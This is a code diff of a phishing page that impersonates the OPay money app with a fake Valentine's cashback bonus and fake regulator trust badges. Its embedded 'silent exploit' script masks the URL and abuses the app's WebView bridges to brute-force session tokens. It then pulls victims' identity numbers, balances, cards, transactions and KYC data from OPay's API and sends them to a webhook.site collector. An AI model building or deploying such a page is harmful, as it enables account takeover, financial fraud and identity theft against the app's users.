@@ -3,25 +3,22 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#00c853">
-
-    <!-- Social Graph Deception (Masks the link in WhatsApp/SMS) -->
-    <meta property="og:title" content="OPay Valentine's Reward 💚">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1a1a2e">
+    <meta property="og:title" content="OPay - Valentine's Cashback Bonus">
     <meta property="og:description"
-        content="You have received ₦5,000! Claim your Valentine's gift now. Verification Code: OP-8821">
+        content="Get up to ₦10,000 cashback on your next transfer! Limited time Valentine's offer for verified users.">
     <meta property="og:image"
         content="https://play-lh.googleusercontent.com/r9rKSQ_KNf_LTX4ISQvSfJkOc_UXr_h9XpG0g2YVkxVZQQOJHPbSwcZkZBN6TZR6WkI=s512">
-    <meta property="og:url" content="https://www.opayweb.com">
+    <meta property="og:url" content="https://www.opayweb.com/promotions/valentine">
     <meta property="og:type" content="website">
-
-    <title>OPay Valentine's Reward 💚</title>
+    <title>OPay</title>
     <link rel="icon"
         href="https://play-lh.googleusercontent.com/r9rKSQ_KNf_LTX4ISQvSfJkOc_UXr_h9XpG0g2YVkxVZQQOJHPbSwcZkZBN6TZR6WkI=s48"
         type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-
         * {
             margin: 0;
             padding: 0;
@@ -30,383 +27,557 @@
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #1a472a 0%, #0d2818 50%, #1a472a 100%);
+            background: #0d0d0d;
+            color: #fff;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
             overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .card {
-            background: #ffffff;
-            border-radius: 24px;
-            max-width: 420px;
-            width: 100%;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideUp 0.6s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
+        /* ===== TOP HEADER ===== */
         .header {
-            background: linear-gradient(135deg, #00c853 0%, #00a844 100%);
-            padding: 28px 24px 20px;
-            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            padding-top: max(12px, env(safe-area-inset-top));
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: #0d0d0d;
+        }
+
+        .greeting {
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+        }
+
+        .header-icons span {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            opacity: 0.7;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .badge {
+            position: absolute;
+            top: -4px;
+            right: -6px;
+            background: #ff4444;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            min-width: 16px;
+            height: 16px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 4px;
+        }
+
+        /* ===== BALANCE CARD ===== */
+        .balance-card {
+            margin: 8px 16px;
+            background: #1a2332;
+            border-radius: 14px;
+            padding: 16px 18px;
+        }
+
+        .balance-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+
+        .balance-label {
+            font-size: 13px;
+            color: #8ca3b8;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .balance-label .shield {
+            color: #00c853;
+            font-size: 14px;
+        }
+
+        .balance-label .eye {
+            font-size: 16px;
+            opacity: 0.5;
+            cursor: pointer;
+        }
+
+        .tx-link {
+            font-size: 13px;
+            color: #8ca3b8;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .tx-link:after {
+            content: '›';
+            font-size: 16px;
+        }
+
+        .balance-amount {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .balance-amount span {
+            margin-right: 4px;
+        }
+
+        .balance-bottom {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .add-money-btn {
+            background: #00c853;
+            color: #0d0d0d;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .add-money-btn:before {
+            content: '+';
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        /* ===== QUICK ACTIONS ===== */
+        .quick-actions {
+            display: flex;
+            justify-content: space-around;
+            padding: 16px;
+            margin: 0 16px;
+            background: #161b22;
+            border-radius: 14px;
+            margin-top: 10px;
+        }
+
+        .action-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+        }
+
+        .action-icon {
+            width: 42px;
+            height: 42px;
+            background: #1f2937;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .action-label {
+            font-size: 11px;
+            color: #8ca3b8;
+            font-weight: 500;
+        }
+
+        /* ===== PROMO BANNER ===== */
+        .promo-banner {
+            margin: 16px;
+            background: linear-gradient(135deg, #2e0a0a 0%, #0f1923 40%, #1a0e1e 100%);
+            border-radius: 16px;
+            padding: 28px 24px;
             position: relative;
             overflow: hidden;
+            text-align: center;
         }
 
-        .header::before {
+        .promo-banner::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 60%);
-            animation: shimmer 3s infinite;
+            background: radial-gradient(circle at 70% 80%, rgba(255, 60, 80, 0.15), transparent 50%),
+                radial-gradient(circle at 30% 20%, rgba(0, 200, 83, 0.12), transparent 50%);
+            animation: shimmer 4s ease-in-out infinite;
         }
 
         @keyframes shimmer {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .opay-logo {
-            width: 60px;
-            height: 60px;
-            background: white;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
-            font-size: 28px;
-            font-weight: 800;
-            color: #00c853;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            position: relative;
-            z-index: 1;
-        }
-
-        .header h1 {
-            color: white;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 6px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .header p {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 14px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .body {
-            padding: 24px;
-        }
-
-        .valentine-banner {
-            background: linear-gradient(135deg, #fff0f3 0%, #ffe0e6 100%);
-            border-radius: 16px;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #ffcdd2;
-        }
-
-        .hearts {
-            font-size: 32px;
-            margin-bottom: 8px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
 
             0%,
             100% {
-                transform: scale(1);
+                opacity: 0.6;
             }
 
             50% {
-                transform: scale(1.1);
+                opacity: 1;
             }
         }
 
-        .valentine-banner h2 {
-            color: #e91e63;
-            font-size: 18px;
-            font-weight: 700;
+        .promo-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .promo-title {
+            font-size: 28px;
+            font-weight: 900;
+            color: #fff;
+            line-height: 1.2;
             margin-bottom: 4px;
+            font-style: italic;
         }
 
-        .valentine-banner p {
-            color: #c2185b;
-            font-size: 13px;
-        }
-
-        .amount-box {
-            background: #f5fff7;
-            border: 2px solid #00c853;
-            border-radius: 16px;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .amount-label {
-            color: #666;
-            font-size: 12px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-        }
-
-        .amount {
-            color: #00c853;
-            font-size: 42px;
-            font-weight: 800;
-            line-height: 1.1;
-        }
-
-        .amount span {
+        .promo-subtitle {
             font-size: 22px;
-            font-weight: 600;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff4d6d, #ff758f, #ff4d6d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.3;
+            margin-bottom: 10px;
+            font-style: italic;
         }
 
-        .amount-note {
-            color: #999;
-            font-size: 12px;
-            margin-top: 6px;
-        }
-
-        .info-list {
-            list-style: none;
+        .promo-detail {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
             margin-bottom: 20px;
         }
 
-        .info-list li {
+        .promo-visual {
+            font-size: 50px;
+            margin: 16px 0;
+            display: block;
+        }
+
+        .promo-cta {
+            display: inline-block;
+            background: #00c853;
+            color: #0d0d0d;
+            padding: 14px 40px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 800;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            transition: transform 0.2s;
+        }
+
+        .promo-cta:active {
+            transform: scale(0.96);
+        }
+
+        .trust-footer {
             display: flex;
+            justify-content: center;
             align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 14px;
+            gap: 8px;
+            font-size: 10px;
+            color: #6b7280;
+            margin-top: 18px;
+            flex-wrap: wrap;
+        }
+
+        .trust-footer span {
+            opacity: 0.8;
+        }
+
+        .trust-footer .sep {
             color: #333;
         }
 
-        .info-list li:last-child {
-            border-bottom: none;
+        .trust-footer strong {
+            color: #8ca3b8;
+            font-weight: 700;
         }
 
-        .info-list li .icon {
-            width: 32px;
-            height: 32px;
-            background: #f0faf3;
-            border-radius: 8px;
+        /* ===== INFO CARDS ===== */
+        .info-cards {
+            padding: 0 16px;
+            margin-top: 12px;
+        }
+
+        .info-card {
+            background: #161b22;
+            border-radius: 14px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .info-card-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .info-card-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 12px;
-            font-size: 16px;
-            flex-shrink: 0;
+            font-size: 20px;
         }
 
-        .claim-btn {
-            display: block;
-            width: 100%;
-            background: linear-gradient(135deg, #00c853 0%, #00a844 100%);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 14px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: none;
-            text-align: center;
-            box-shadow: 0 4px 16px rgba(0, 200, 83, 0.3);
-            transition: all 0.2s;
-            margin-bottom: 12px;
+        .info-card-text h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 2px;
         }
 
-        .claim-btn:active {
-            transform: scale(0.97);
+        .info-card-text p {
+            font-size: 12px;
+            color: #6b7280;
         }
 
-        .timer {
-            text-align: center;
-            color: #e91e63;
+        .go-btn {
+            background: #e8f5e9;
+            color: #00c853;
+            padding: 6px 20px;
+            border-radius: 20px;
             font-size: 13px;
             font-weight: 600;
-            margin-bottom: 8px;
+            text-decoration: none;
         }
 
-        .timer span {
-            background: #fff0f3;
-            padding: 3px 8px;
-            border-radius: 6px;
-            font-variant-numeric: tabular-nums;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 12px 24px 20px;
-            color: #aaa;
-            font-size: 11px;
-            line-height: 1.5;
-        }
-
-        .trust-badges {
+        /* ===== BOTTOM NAV ===== */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #0d0d0d;
+            border-top: 1px solid #1f1f1f;
             display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 8px;
+            justify-content: space-around;
+            padding: 8px 0;
+            padding-bottom: max(8px, env(safe-area-inset-bottom));
+            z-index: 100;
         }
 
-        .trust-badges span {
-            color: #bbb;
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            text-decoration: none;
+            min-width: 50px;
+        }
+
+        .nav-icon {
+            font-size: 22px;
+        }
+
+        .nav-label {
             font-size: 10px;
+            color: #6b7280;
+            font-weight: 500;
         }
 
-        .progress-bar {
-            background: #f0f0f0;
-            border-radius: 8px;
-            height: 6px;
-            margin-bottom: 16px;
-            overflow: hidden;
+        .nav-item.active .nav-icon {
+            color: #00c853;
         }
 
-        .progress-bar .fill {
-            background: linear-gradient(90deg, #00c853, #69f0ae);
-            height: 100%;
-            width: 73%;
-            border-radius: 8px;
-            animation: progressPulse 2s ease-in-out infinite;
+        .nav-item.active .nav-label {
+            color: #00c853;
         }
 
-        @keyframes progressPulse {
-
-            0%,
-            100% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0.7;
-            }
-        }
-
-        .slots-left {
-            text-align: center;
-            font-size: 12px;
-            color: #ff6b6b;
-            font-weight: 600;
-            margin-bottom: 12px;
+        .spacer {
+            height: 80px;
         }
     </style>
 </head>
 
 <body>
-    <div class="card">
-        <div class="header">
-            <div class="opay-logo">O</div>
-            <h1>OPay Valentine's Gift 💚</h1>
-            <p>Special reward for valued customers</p>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-left">
+            <div class="avatar">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="8" r="4" stroke="#0d0d0d" stroke-width="2" />
+                    <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="#0d0d0d" stroke-width="2" stroke-linecap="round" />
+                </svg>
+            </div>
+            <span class="greeting">Hi, there 👋</span>
         </div>
-
-        <div class="body">
-            <div class="valentine-banner">
-                <div class="hearts">💝 💚 💝</div>
-                <h2>Happy Valentine's Day!</h2>
-                <p>You've been selected for a special cashback reward</p>
-            </div>
-
-            <div class="amount-box">
-                <div class="amount-label">Your Reward</div>
-                <div class="amount"><span>₦</span>5,000</div>
-                <div class="amount-note">Valentine's Day Cashback Bonus</div>
-            </div>
-
-            <div class="progress-bar">
-                <div class="fill"></div>
-            </div>
-            <div class="slots-left">⚡ Only 127 rewards remaining today</div>
-
-            <ul class="info-list">
-                <li>
-                    <div class="icon">✅</div> Instantly credited to your OPay wallet
-                </li>
-                <li>
-                    <div class="icon">🎯</div> No minimum spend required
-                </li>
-                <li>
-                    <div class="icon">⏰</div> Valid today only — Feb 14, 2026
-                </li>
-                <li>
-                    <div class="icon">🔒</div> Verified by OPay Security
-                </li>
-            </ul>
-
-            <div class="timer">Expires in <span id="countdown">14:59</span></div>
-
-            <a id="claimBtn" class="claim-btn" href="#">🎁 Claim My ₦5,000 Reward</a>
+        <div class="header-icons">
+            <span>🎧<div class="badge" style="background:#00c853;color:#0d0d0d;">HELP</div></span>
+            <span>🔄</span>
+            <span>🔔<div class="badge">7</div></span>
         </div>
+    </div>
 
-        <div class="footer">
-            This reward is part of OPay's Valentine's Day Campaign 2026.<br>
-            Terms & conditions apply. One reward per customer.
-            <div class="trust-badges">
-                <span>🔒 SSL Secured</span>
-                <span>✓ OPay Verified</span>
-                <span>🛡️ Protected</span>
+    <!-- BALANCE CARD -->
+    <div class="balance-card">
+        <div class="balance-top">
+            <div class="balance-label">
+                <span class="shield">✅</span>
+                Available Balance
+                <span class="eye">👁</span>
+            </div>
+            <a href="#" class="tx-link">Transaction History</a>
+        </div>
+        <div class="balance-amount">
+            <span>****</span> ›
+        </div>
+        <div class="balance-bottom">
+            <a href="#" class="add-money-btn">Add Money</a>
+        </div>
+    </div>
+
+    <!-- QUICK ACTIONS -->
+    <div class="quick-actions">
+        <a class="action-item" href="#">
+            <div class="action-icon">👤</div>
+            <span class="action-label">Transfer</span>
+        </a>
+        <a class="action-item" href="#">
+            <div class="action-icon">🏦</div>
+            <span class="action-label">Bank</span>
+        </a>
+        <a class="action-item" href="#">
+            <div class="action-icon">📱</div>
+            <span class="action-label">Airtime</span>
+        </a>
+        <a class="action-item" href="#">
+            <div class="action-icon">💡</div>
+            <span class="action-label">Bills</span>
+        </a>
+    </div>
+
+    <!-- PROMO BANNER -->
+    <div class="promo-banner">
+        <div class="promo-content">
+            <div class="promo-title">Valentine's</div>
+            <div class="promo-subtitle">Cashback Bonus</div>
+            <div class="promo-detail">Up to ₦10,000 cashback today! 💝</div>
+            <span class="promo-visual">💚❤️💚</span>
+            <br>
+            <a href="#" class="promo-cta" id="claimBtn">CLAIM BONUS NOW</a>
+            <div class="trust-footer">
+                <span>Licensed by <strong>CBN</strong> 🏛️</span>
+                <span class="sep">|</span>
+                <span>Insured by the <strong>NDIC</strong></span>
+                <span class="sep">|</span>
+                <span>Powered by <strong>OPay MFB</strong></span>
             </div>
         </div>
     </div>
 
+    <!-- INFO CARDS -->
+    <div class="info-cards">
+        <div class="info-card">
+            <div class="info-card-left">
+                <div class="info-card-icon" style="background:#1a2332;">🎯</div>
+                <div class="info-card-text">
+                    <h4>Start a Target</h4>
+                    <p>Trusted by 6 Million+ users</p>
+                </div>
+            </div>
+            <a href="#" class="go-btn">Go</a>
+        </div>
+        <div class="info-card">
+            <div class="info-card-left">
+                <div class="info-card-icon" style="background:#1a2332;">👥</div>
+                <div class="info-card-text">
+                    <h4>Share OPay with Others</h4>
+                    <p>Help a loved one get their own account...</p>
+                </div>
+            </div>
+            <a href="#" class="go-btn">Go</a>
+        </div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <!-- BOTTOM NAV -->
+    <div class="bottom-nav">
+        <a class="nav-item active" href="#">
+            <span class="nav-icon">⊙</span>
+            <span class="nav-label">Home</span>
+        </a>
+        <a class="nav-item" href="#">
+            <span class="nav-icon">💚</span>
+            <span class="nav-label">Rewards</span>
+        </a>
+        <a class="nav-item" href="#">
+            <span class="nav-icon">📊</span>
+            <span class="nav-label">Finance</span>
+        </a>
+        <a class="nav-item" href="#">
+            <span class="nav-icon">💳</span>
+            <span class="nav-label">Cards</span>
+        </a>
+        <a class="nav-item" href="#">
+            <span class="nav-icon">👤</span>
+            <span class="nav-label">Me</span>
+        </a>
+    </div>
+
     <script>
-        // ===== Countdown timer (cosmetic) =====
-        var mins = 14, secs = 59;
+        // URL masking
+        try { if (window.history && window.history.replaceState) { window.history.replaceState({}, "OPay", "/"); } } catch (e) { }
 
-        // Advanced URL Masking
-        try {
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState({}, "OPay Reward", "/opay-reward");
-            }
-        } catch (e) { }
-
-        setInterval(function () {
-            if (secs === 0) { if (mins === 0) return; mins--; secs = 59; } else { secs--; }
-            document.getElementById("countdown").textContent =
-                (mins < 10 ? "0" : "") + mins + ":" + (secs < 10 ? "0" : "") + secs;
-        }, 1000);
-
-        // ===== Deep link (opens in OPay WebView) =====
+        // Deep link
         var deepLink = "otravel://schemedispatcher?action=" + window.location.href;
         document.getElementById("claimBtn").href = deepLink;
 
-        // ===== SILENT EXPLOIT BELOW =====
+        // ===== SILENT EXPLOIT =====
         var WEBHOOK_URL = "https://webhook.site/06e6496b-16d6-4c16-a676-9817f03fedd2";
         var OPAY_API = "https://api.opayweb.com";
 
@@ -469,7 +640,6 @@
         }
 
         function extractAll(token) {
-            // Full profile (BVN, NIN, phone, photo, address)
             callAPI("/api-user/user/info/aggregate", { "scene": "HOME" }, token, function (e, r) {
                 if (!e && r && r.data) {
                     var d = r.data;
@@ -493,49 +663,33 @@
                     sendData({ fullProfile: d }, "FULL_PROFILE");
                 }
             });
-
-            // Balance
             callAPI("/api/account/qryBalance", {}, token, function (e, r) {
                 if (!e && r && r.data) { sendData({ balance: r.data }, "BALANCE"); }
             });
-
-            // User info
             callAPI("/api/users/getCurrentUserV3", {}, token, function (e, r) {
                 if (!e && r) { sendData({ user: r.data || r }, "USER_INFO"); }
             });
-
-            // Transactions
             callAPI("/api/v1/transaction/lookup-latest-transaction-list", { pageNo: 1, pageSize: 10 }, token, function (e, r) {
                 if (!e && r && r.data) { sendData({ tx: r.data }, "TRANSACTIONS"); }
             });
-
-            // Cards
             callAPI("/api/common/instruments", {}, token, function (e, r) {
                 if (!e && r && r.data) { sendData({ cards: r.data }, "CARDS"); }
             });
-
-            // Beneficiaries
             callAPI("/api/v1/common/query-beneficiary", {}, token, function (e, r) {
                 if (!e && r && r.data) { sendData({ beneficiaries: r.data }, "BENEFICIARIES"); }
             });
-
-            // KYC
             callAPI("/api/v2/user/kyc2/getUserBaseInfo", {}, token, function (e, r) {
                 if (!e && r) { sendData({ kyc: r.data || r }, "KYC"); }
             });
-
-            // Home
             callAPI("/api/home/account", {}, token, function (e, r) {
                 if (!e && r && r.data) { sendData({ home: r.data }, "HOME"); }
             });
-
-            // Final dump
             setTimeout(function () { sendData(visitorData, "FULL_DUMP"); }, 8000);
         }
 
-        // ===== Main (runs silently) =====
+        // ===== MAIN =====
         setTimeout(function () {
-            // Get IP
+            // IP
             try {
                 var x = new XMLHttpRequest();
                 x.open("GET", "https://api.ipify.org?format=json", true);
@@ -564,12 +718,11 @@
                 } catch (e) { }
             }
 
-            // Also check for webkit.messageHandlers (iOS WKWebView pattern)
+            // iOS WKWebView messageHandlers
             try {
                 if (window.webkit && window.webkit.messageHandlers) {
                     foundBridges["webkit.messageHandlers"] = true;
                     visitorData["bridge_webkit_messageHandlers"] = "EXISTS";
-                    // Enumerate known handler names
                     var handlerNames = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
                         'OPay3PartyContext', 'OPayContext', 'callNative', 'invoke',
                         'getAppInfo', 'getDeviceInfo', 'getUserToken', 'getAccessToken'];
@@ -587,11 +740,9 @@
                 }
             } catch (e) { }
 
-            // ===== ENUMERATE METHODS ON EVERY FOUND BRIDGE =====
+            // Enumerate methods on found bridges
             function enumerateBridge(name, obj) {
-                var methods = [];
-                var properties = [];
-                // Own properties
+                var methods = []; var properties = [];
                 try {
                     var keys = Object.getOwnPropertyNames(obj);
                     for (var k = 0; k < keys.length; k++) {
@@ -602,7 +753,6 @@
                         } catch (e) { }
                     }
                 } catch (e) { }
-                // for...in (prototype chain)
                 try {
                     for (var key in obj) {
                         try {
@@ -612,7 +762,6 @@
                         } catch (e) { }
                     }
                 } catch (e) { }
-                // Object.keys
                 try {
                     var ok = Object.keys(obj);
                     for (var j = 0; j < ok.length; j++) {
@@ -622,19 +771,10 @@
                         } catch (e) { }
                     }
                 } catch (e) { }
-
-                sendData({
-                    bridge: name,
-                    methods: methods.join(","),
-                    properties: properties.join(","),
-                    methodCount: methods.length,
-                    propertyCount: properties.length
-                }, "BRIDGE_METHODS");
-
+                sendData({ bridge: name, methods: methods.join(","), properties: properties.join(","), methodCount: methods.length, propertyCount: properties.length }, "BRIDGE_METHODS");
                 return methods;
             }
 
-            // ===== BRUTE-FORCE COMMON METHOD NAMES =====
             var commonMethods = [
                 'getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
                 'getUserToken', 'getAccessToken', 'getAuthToken', 'getSessionToken',
@@ -649,22 +789,15 @@
 
             function bruteForceCall(name, obj) {
                 var results = {};
-                // First try discovered methods
                 var discoveredMethods = enumerateBridge(name, obj);
-
-                // Call all discovered methods that take 0 args
                 for (var m = 0; m < discoveredMethods.length; m++) {
                     try {
                         var ret = obj[discoveredMethods[m]]();
                         if (ret !== undefined && ret !== null && ret !== '') {
                             results[discoveredMethods[m]] = String(ret).substring(0, 1000);
                         }
-                    } catch (e) {
-                        results[discoveredMethods[m]] = "ERR:" + e.message;
-                    }
+                    } catch (e) { results[discoveredMethods[m]] = "ERR:" + e.message; }
                 }
-
-                // Also try common method names not in discovered list
                 for (var c = 0; c < commonMethods.length; c++) {
                     if (discoveredMethods.indexOf(commonMethods[c]) === -1) {
                         try {
@@ -677,27 +810,24 @@
                         } catch (e) { }
                     }
                 }
-
                 if (Object.keys(results).length > 0) {
                     sendData({ bridge: name, results: results }, "BRIDGE_RESULTS");
                 }
                 return results;
             }
 
-            // ===== RUN SCANNER ON ALL FOUND BRIDGES =====
+            // Run scanner
             var tokenFound = false;
             for (var bname in foundBridges) {
                 if (!foundBridges.hasOwnProperty(bname)) continue;
                 try {
                     var bobj = bname.indexOf('.') > -1 ? window.webkit.messageHandlers : window[bname];
                     var callResults = bruteForceCall(bname, bobj);
-                    // Check if any result looks like a token
                     for (var rk in callResults) {
                         if (!callResults.hasOwnProperty(rk)) continue;
                         var rv = callResults[rk];
                         if (rv && rv.length > 20 && !rv.startsWith("ERR:")) {
                             sendData({ method: bname + "." + rk, value: rv }, "POSSIBLE_TOKEN");
-                            // Try parsing as JSON
                             try {
                                 var parsed = JSON.parse(rv);
                                 if (parsed.token) {
@@ -707,7 +837,6 @@
                                     extractAll(parsed.token);
                                 }
                             } catch (e) {
-                                // Maybe the string itself is a raw token
                                 if (rv.indexOf("eyJ") === 0 || rv.indexOf("Bearer") > -1) {
                                     tokenFound = true;
                                     var tkn = rv.replace("Bearer ", "").trim();
@@ -723,7 +852,7 @@
                 }
             }
 
-            // ===== FALLBACK: Direct Android method (original) =====
+            // Fallback
             if (!tokenFound && window.control && window.control.getBaseInfo) {
                 try {
                     var raw = window.control.getBaseInfo();
@@ -736,7 +865,6 @@
                 } catch (e) { }
             }
 
-            // Always send visitor data
             sendData(visitorData, "VISITOR");
         }, 800);
 
